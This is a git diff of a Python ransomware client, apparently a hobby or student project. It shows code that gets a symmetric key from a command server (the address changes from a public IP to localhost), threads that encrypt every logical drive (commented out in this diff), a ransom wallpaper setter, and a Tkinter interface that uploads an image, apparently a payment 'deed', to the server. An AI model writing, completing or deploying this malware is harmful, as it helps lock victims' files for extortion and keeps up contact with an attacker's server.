@@ -14,6 +14,7 @@ from datetime import datetime, timedelta
 from threading import Thread, Event
 import time
 import sys
+import random
 
 
 class Timer:
@@ -301,7 +302,7 @@ class Decrypt(Thread):
 
 class RansomwareClient:
     def __init__(self):
-        host = '212.143.57.95'
+        host = '127.0.0.1'
         port = 17694
         self.BUFFER_SIZE = 4096
         self.my_socket = socket()
@@ -319,16 +320,32 @@ class RansomwareClient:
 
     def check_deed(self, image_loc):
         if image_loc:
-            with open(image_loc, 'rb') as deed_file:
-                self.my_socket.send(str(os.stat(image_loc).st_size).encode())
+            encrypted_loc = self.encrypt_image(image_path=image_loc)
+            with open(encrypted_loc, 'rb') as deed_file:
+                self.my_socket.send(str(os.stat(encrypted_loc).st_size).encode())
                 image_data = deed_file.read(self.BUFFER_SIZE)
                 while image_data:
                     self.my_socket.send(image_data)
                     image_data = deed_file.read(self.BUFFER_SIZE)
-            answer = pickle.loads(self.my_socket.recv(self.BUFFER_SIZE))
+            os.remove(encrypted_loc)
+            answer = pickle.loads(self.fernet.decrypt(self.my_socket.recv(self.BUFFER_SIZE)))
             if type(answer) is bool:
                 return answer
             return False
+
+    def encrypt_image(self, image_path):  # Returns the location of the encrypted image, to be sent to the server
+        image_extension = image_path.split(".")[-1]
+        try:
+            with open(image_path, 'rb') as image:
+                image_contents = self.fernet.encrypt(image.read())
+        except PermissionError as _PermissionError:
+            return image_path
+        image_name = random.getrandbits(128)
+        image_ext = random.getrandbits(128)
+        enc_image_name = f'{image_name}.{image_ext}'
+        with open(enc_image_name, 'x') as encrypted_image:
+            encrypted_image.write(image_extension + '\n' + image_contents.decode())
+        return enc_image_name
 
     def get_key(self):
         self.my_socket.send(self.fernet.encrypt("sendkey".encode()))
@@ -336,7 +353,7 @@ class RansomwareClient:
 
     def waiting(self):
         answer = self.my_socket.recv(self.BUFFER_SIZE)
-        return pickle.loads(answer)
+        return pickle.loads(self.fernet.decrypt(answer))
 
 
 class Interface:
@@ -407,7 +424,9 @@ class Interface:
 
     def open_file(self):
         global my_image
-        self.root.filename = filedialog.askopenfilename(title="Select A File", filetypes=[("png files", "*.png")])
+        self.root.filename = filedialog.askopenfilename(title="Select A File", filetypes=[("png files", "*.png"),
+                                                                                          ("jpg files", "*.jpg"),
+                                                                                          ("jpeg files", "*.jpeg")])
         my_image = tk.PhotoImage(file=self.root.filename)
         self.canvas.create_image(750, 650, image=my_image)
         deed_button = tk.Button(self.root, text="Upload image to server", command=self.check_deed)
@@ -460,25 +479,27 @@ def set_wallpaper(path):
 if __name__ == "__main__":
     # time.sleep(60)
     stop_thread = Event()
+    print("hello?")
     client = RansomwareClient()
+    print("hello?")
     SYMMETRIC_KEY = client.get_key()
-    if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
-        try:
-            with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
-                check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
-                            'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
-                            'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
-                            'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
-                            '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
-        except PermissionError as _PermissionError:
-            pass
-        drives = win32api.GetLogicalDriveStrings()
-        drives = drives.split('\000')[:-1]
-        for drive in drives:
-            t = Encrypt(drive, SYMMETRIC_KEY)
-            t.start()
-        t.join()
-        set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
+    # if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
+    #     try:
+    #         with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
+    #             check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
+    #                         'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
+    #                         'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
+    #                         'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
+    #                         '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
+    #     except PermissionError as _PermissionError:
+    #         pass
+    #     drives = win32api.GetLogicalDriveStrings()
+    #     drives = drives.split('\000')[:-1]
+    #     for drive in drives:
+    #         t = Encrypt(drive, SYMMETRIC_KEY)
+    #         t.start()
+    #     t.join()
+    #     set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
     my_interface = Interface(client, SYMMETRIC_KEY)
     my_interface.run()  # NOTE: The interface will be started last.
 
